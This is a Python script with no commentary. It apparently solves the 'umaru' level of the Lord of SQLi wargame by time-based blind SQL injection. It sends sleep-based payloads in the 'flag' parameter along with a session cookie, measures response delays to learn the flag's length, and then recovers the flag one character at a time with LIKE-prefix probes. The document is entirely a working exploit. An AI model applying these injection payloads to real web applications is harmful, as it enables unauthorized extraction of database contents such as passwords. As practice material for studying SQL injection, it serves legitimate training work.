import requests, urllib, time

url = "https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php"

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}

plen = 1
while True:
    param = {"flag": "sleep((length(flag)=" + str(plen) + ")*5)&&(select 1 union select 2)"}
    start = time.time()
    response = requests.get(url, params=param, cookies=cookie)
    end = time.time()

    delta = end - start
    if delta > 5:
        print(delta)
        break
    else:
        print("[*] trying get password length.. now " + str(plen))
        plen += 1

print("[*] Password length is " + str(plen))

password = ""

for i in range(plen):
    for j in range(256):
        j = (j + 32) % 256
        param = {"flag": "sleep((flag like '" + password + chr(j) + "%')*5)&&(select 1 union select 2)"}
        start = time.time()
        response = requests.get(url, params=param, cookies=cookie)
        end = time.time()

        delta = end - start
        if delta > 5:
            print(delta)
            password += chr(j)
            break
        print("[*] searching " + str(i+1) + " password character.. now " + str(j))
    print("[*] found password " + str(i+1) +" character! now : " + password)

print("[*] password is " + password)